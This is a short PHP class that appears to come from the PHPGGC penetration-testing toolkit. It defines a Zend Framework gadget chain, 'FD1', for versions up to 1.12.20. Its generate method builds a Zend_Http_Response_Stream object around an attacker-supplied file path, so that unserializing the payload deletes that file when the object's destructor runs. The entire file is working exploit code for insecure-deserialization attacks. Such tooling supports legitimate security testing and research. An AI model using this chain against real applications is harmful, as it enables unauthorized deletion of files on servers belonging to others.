<?php

namespace GadgetChain\ZendFramework;

class FD1 extends \PHPGGC\GadgetChain\FileDelete
{
    public $version = '? <= 1.12.20';
    public $vector = '__destruct';
    public $author = 'mpchadwick';
    public $parameters = [
        'remote_file'
    ];

    public function generate(array $parameters)
    {
        $file = $parameters['remote_file'];

        return new \Zend_Http_Response_Stream(
            true,
            $file
        );
    }
}